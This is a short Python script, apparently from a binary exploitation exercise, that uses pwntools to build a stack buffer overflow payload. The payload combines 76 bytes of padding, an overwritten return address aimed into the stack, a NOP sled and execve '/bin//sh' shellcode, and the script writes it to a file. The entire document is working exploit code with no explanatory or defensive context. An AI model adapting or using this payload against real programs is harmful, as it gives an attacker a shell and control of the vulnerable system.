#I changed the bytes from 120 to 125 after viewing the stack
from pwn import *

padding = b'A'*76
ret = p32(0xffffd078+125)
nop = b'\x90'*240
shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

payload1 = padding+ret+nop+shellcode

with open('payload1','wb') as f:
	f.write(payload1)